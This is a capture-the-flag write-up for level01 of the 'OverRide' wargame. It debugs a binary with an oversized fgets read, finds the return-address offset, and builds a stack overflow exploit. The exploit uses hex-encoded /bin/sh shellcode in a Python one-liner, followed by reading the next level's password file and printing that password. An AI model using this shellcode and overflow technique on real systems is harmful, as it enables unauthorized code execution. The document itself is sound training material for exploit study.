# Level 01

Once logged in, you will see a binary.

```
$ ssh localhost -p 4242 -l level01
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level01@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
level01@OverRide:~$ ls
level01
level01@OverRide:~$
```

Let's run the program.

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...

level01@OverRide:~$
```

We don't know how the program works, so let's take a look at the binary.

```
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.

gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
[...]
gdb-peda$ info variables
[...]
0x0804a040  a_user_name
```

We see there are functions, and global variable declared. By decompiling the source, we at least have an idea what the username and password are: `"dat_wil"` and `"admin"`. Even with the "correct" username and password, we still haven't captured the flag.

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
aaaaaaaaaaaaaaaa
nope, incorrect password...

level01@OverRide:~$
```

Checking the source again, it appears that the second call to `fgets` reads in more bytes (`0x64` = 100) than the buffer's declared size (`0x40` = 64).

Let's try a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to see if we can overwrite the `EIP` register for when it returns from `fgets`. This would allow us to insert a [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php) into memory through user input and then return to it by modifying the `EIP` register with input as well.

This is the PETA GDB output after inputting the username `"dat_wil"` and a 200-character buffer overflow pattern (see link above). Note the `EIP` register that has been overwritten by `0x37634136` (`"6Ac7"` as a string)

Inputs:
```
dat_wil
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
                                                                                ^ 81 characters in (therefore an offset of 80)
```

PETA GDB output:
```
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0x33634132 ('2Ac3')
ECX: 0xffffffff
EDX: 0xf7fd08b8 --> 0x0
ESI: 0x0
EDI: 0x41346341 ('Ac4A')
EBP: 0x63413563 ('c5Ac')
ESP: 0xffffd720 ("Ac8Ac9Ad0Ad1Ad2")
EIP: 0x37634136 ('6Ac7')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x37634136
[------------------------------------stack-------------------------------------]
0000| 0xffffd720 ("Ac8Ac9Ad0Ad1Ad2")
0004| 0xffffd724 ("c9Ad0Ad1Ad2")
0008| 0xffffd728 ("0Ad1Ad2")
0012| 0xffffd72c --> 0x326441 ('Ad2')
0016| 0xffffd730 --> 0x0
0020| 0xffffd734 --> 0xffffd71c ("6Ac7Ac8Ac9Ad0Ad1Ad2")
0024| 0xffffd738 --> 0xffffd7bc --> 0xffffd8f5 ("TERM=xterm-256color")
0028| 0xffffd73c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x37634136 in ?? ()
gdb-peda$ stack
0000| 0xffffd720 ("Ac8Ac9Ad0Ad1Ad2")
0004| 0xffffd724 ("c9Ad0Ad1Ad2")
0008| 0xffffd728 ("0Ad1Ad2")
0012| 0xffffd72c --> 0x326441 ('Ad2')
0016| 0xffffd730 --> 0x0
0020| 0xffffd734 --> 0xffffd71c ("6Ac7Ac8Ac9Ad0Ad1Ad2")
0024| 0xffffd738 --> 0xffffd7bc --> 0xffffd8f5 ("TERM=xterm-256color")
0028| 0xffffd73c --> 0x0

```

The last thing we need to create the exploit input is the address where our shellcode will start. We find this by looking at where `fgets` stores the input during its second call (`0xffffd6ec`). (Note: in testing, we've found that this address can change if you run the command on different machines. If this address doesn't work, you can recalculate it with the following `ltrace` function)

```
level01@OverRide:~$ ltrace ./level01 2> /tmp/ltrace.txt   # NOTE: sending ltrace output to a temp file
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

level01@OverRide:~$ cat /tmp/ltrace.txt
__libc_start_main(0x80484d0, 1, -10284, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...)                     = 39
printf("Enter Username: ")                                      = 16
fgets("dat_wil\n", 256, 0xf7fcfac0)                             = 0x0804a040
puts("verifying username....\n")                                = 24
puts("Enter Password: ")                                        = 17
fgets("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 100, 0xf7fcfac0)   = 0xffffd6ec
puts("nope, incorrect password...\n")                           = 29
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Here's the steps we used to get to our final exploit.

First step:

```
dat_wil    # the username that we found by disassembling verify_user_name()
[  shellcode  ] + [  padding up to 80 chars  ] + [  address  ]
```

Next step:

```
dat_wil
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * [  offset (80) - length of first (28) - 52  ] + [  `0xffffd6ec` in the correct endian-ness  ]
```

And now in Python:
```
python -c 'import struct; print "dat_wil\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*52 + struct.pack("I", 0xffffd6ec)'
```

And now as a command:

```
(python -c 'import struct; print "dat_wil\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*52 + struct.pack("I", 0xffffd6ec)' ; cat -) | ./level01
```

And now in action:
```
level01@OverRide:~$ (python -c 'import struct; print "dat_wil\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*52 + struct.pack("I", 0xffffd6ec)' ; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
